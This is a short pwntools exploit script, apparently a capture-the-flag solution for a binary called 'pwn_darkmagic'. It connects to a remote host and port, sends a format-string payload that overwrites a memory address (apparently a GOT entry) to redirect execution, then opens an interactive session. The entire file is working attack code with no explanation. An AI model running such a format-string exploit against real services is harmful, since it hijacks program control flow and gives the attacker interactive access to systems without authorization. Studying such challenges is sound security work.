
from pwn import *

context.clear(arch='amd64')
# r = process('./pwn_darkmagic')
r = remote('35.234.65.24', 30750)

r.readline()
r.sendline(fmtstr_payload(8, {0x0601038: 0x0400737}))
r.sendline('A')

r.interactive()
